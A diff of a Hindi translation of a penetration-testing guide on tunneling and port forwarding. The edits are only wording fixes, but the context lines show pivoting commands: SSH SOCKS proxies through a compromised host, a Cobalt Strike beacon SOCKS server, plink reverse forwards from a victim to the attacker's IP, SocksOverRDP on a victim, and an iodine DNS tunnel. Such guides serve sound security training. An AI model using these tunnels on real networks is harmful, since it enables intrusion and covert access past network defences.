@@ -1,8 +1,8 @@
-# Tunneling and Port Forwarding
+# टनलिंग और पोर्ट फॉरवर्डिंग
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Nmap टिप
 
 > [!WARNING]
 > **ICMP** और **SYN** स्कैन को सॉक्स प्रॉक्सी के माध्यम से टनल नहीं किया जा सकता, इसलिए हमें **पिंग डिस्कवरी** को **अक्षम** करना होगा (`-Pn`) और इसके काम करने के लिए **TCP स्कैन** (`-sT`) निर्दिष्ट करना होगा।
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> जहाँ भी
+स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> कहीं भी
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-टीमसर्वर में एक पोर्ट खोलें जो सभी इंटरफेस में सुन रहा हो जिसे **बिकन के माध्यम से ट्रैफ़िक को रूट करने के लिए** उपयोग किया जा सके।
+टीमसर्वर में एक पोर्ट खोलें जो सभी इंटरफेस में सुन रहा है जिसे **बिकन के माध्यम से ट्रैफ़िक को रूट करने के लिए** उपयोग किया जा सकता है।
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -154,7 +154,7 @@ To note:
 
 - Beacon's reverse port forward is designed to **ट्रैफ़िक को Team Server तक टनल करने के लिए, व्यक्तिगत मशीनों के बीच रिले करने के लिए नहीं**।
 - ट्रैफ़िक **Beacon के C2 ट्रैफ़िक के भीतर टनल किया जाता है**, जिसमें P2P लिंक शामिल हैं।
-- **प्रशासक विशेषाधिकारों की आवश्यकता नहीं है** उच्च पोर्ट पर रिवर्स पोर्ट फॉरवर्ड बनाने के लिए।
+- **प्रशासक विशेषाधिकार की आवश्यकता नहीं है** उच्च पोर्ट पर रिवर्स पोर्ट फॉरवर्ड बनाने के लिए।
 
 ### rPort2Port local
 
@@ -294,7 +294,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### SSL Socat Tunnel
 
-**/bin/sh console**
+**/bin/sh कंसोल**
 
 दोनों पक्षों पर प्रमाणपत्र बनाएं: क्लाइंट और सर्वर
 ```bash
@@ -322,7 +322,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 यह एक कंसोल PuTTY संस्करण की तरह है (विकल्प ssh क्लाइंट के बहुत समान हैं)।
 
-चूंकि यह बाइनरी पीड़ित में निष्पादित की जाएगी और यह एक ssh क्लाइंट है, हमें अपनी ssh सेवा और पोर्ट खोलने की आवश्यकता है ताकि हम एक रिवर्स कनेक्शन प्राप्त कर सकें। फिर, केवल स्थानीय रूप से सुलभ पोर्ट को हमारे मशीन के पोर्ट पर अग्रेषित करने के लिए:
+चूंकि यह बाइनरी पीड़ित में निष्पादित की जाएगी और यह एक ssh क्लाइंट है, हमें अपनी ssh सेवा और पोर्ट खोलने की आवश्यकता है ताकि हम एक रिवर्स कनेक्शन प्राप्त कर सकें। फिर, केवल स्थानीय रूप से सुलभ पोर्ट को हमारे मशीन के एक पोर्ट पर अग्रेषित करने के लिए:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -354,7 +354,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-अब हम **RDP** के माध्यम से **`mstsc.exe`** का उपयोग करके **शिकार** से **जुड़ सकते** हैं, और हमें एक **प्रॉम्प्ट** प्राप्त होना चाहिए जो कहता है कि **SocksOverRDP प्लगइन सक्षम है**, और यह **127.0.0.1:1080** पर **सुन** रहा होगा।
+अब हम **RDP** के माध्यम से **`mstsc.exe`** का उपयोग करके **शिकार** से **जुड़** सकते हैं, और हमें एक **प्रॉम्प्ट** प्राप्त होना चाहिए जो कहता है कि **SocksOverRDP प्लगइन सक्षम है**, और यह **127.0.0.1:1080** पर **सुन** रहा होगा।
 
 **RDP** के माध्यम से **जुड़ें** और शिकार मशीन में `SocksOverRDP-Server.exe` बाइनरी अपलोड और निष्पादित करें:
 ```
@@ -383,7 +383,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-यह एक प्रॉक्सी के खिलाफ प्रमाणीकरण करता है और एक पोर्ट को स्थानीय रूप से बाइंड करता है जो आप द्वारा निर्दिष्ट बाहरी सेवा की ओर अग्रेषित होता है। फिर, आप इस पोर्ट के माध्यम से अपनी पसंद के उपकरण का उपयोग कर सकते हैं।\
+यह एक प्रॉक्सी के खिलाफ प्रमाणीकरण करता है और एक पोर्ट को स्थानीय रूप से बाइंड करता है जो आपके द्वारा निर्दिष्ट बाहरी सेवा की ओर अग्रेषित होता है। फिर, आप इस पोर्ट के माध्यम से अपनी पसंद के उपकरण का उपयोग कर सकते हैं।\
 उदाहरण के लिए, वह पोर्ट 443 को अग्रेषित करता है।
 ```
 Username Alice
@@ -405,13 +405,13 @@ Microsoft द्वारा बनाया गया एक रिवर्स
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-दोनों सिस्टम में टन एडाप्टर बनाने और DNS क्वेरी का उपयोग करके उनके बीच डेटा टनल करने के लिए रूट की आवश्यकता होती है।
+दोनों सिस्टम में रूट की आवश्यकता होती है ताकि टन एडाप्टर बनाए जा सकें और DNS क्वेरी का उपयोग करके उनके बीच डेटा टनल किया जा सके।
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-यह टनल बहुत धीमी होगी। आप इस टनल के माध्यम से एक संकुचित SSH कनेक्शन बना सकते हैं:
+टनल बहुत धीमा होगा। आप इस टनल के माध्यम से एक संकुचित SSH कनेक्शन बना सकते हैं:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -442,7 +442,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Proxychains DNS बदलें
 
-Proxychains `gethostbyname` libc कॉल को इंटरसेप्ट करता है और tcp DNS अनुरोध को socks प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** रूप से, **DNS** सर्वर जो proxychains उपयोग करता है वह **4.2.2.2** है (हार्डकोडेड)। इसे बदलने के लिए, फ़ाइल संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows वातावरण** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।
+Proxychains `gethostbyname` libc कॉल को इंटरसेप्ट करता है और TCP DNS अनुरोध को SOCKS प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** के रूप में, **DNS** सर्वर जो proxychains उपयोग करता है वह **4.2.2.2** है (हार्डकोडेड)। इसे बदलने के लिए, फ़ाइल संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows वातावरण** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।
 
 ## Go में टनल
 
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **एक उपकरण है जो एक कमांड लाइन में समाधानों को इंटरनेट पर उजागर करता है।**\
-_&#x45;xposition URI इस तरह हैं:_ **UID.ngrok.io**
+_Exposition URI इस तरह हैं:_ **UID.ngrok.io**
 
 ### Installation
 
@@ -492,13 +492,13 @@ chmod a+x ./ngrok
 # Init configuration, with your token
 ./ngrok config edit
 ```
-### Basic usages
+### मूल उपयोग
 
-**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
+**दस्तावेज़ीकरण:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
 _यदि आवश्यक हो, तो प्रमाणीकरण और TLS जोड़ना भी संभव है।_
 
-#### Tunneling TCP
+#### TCP टनलिंग
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
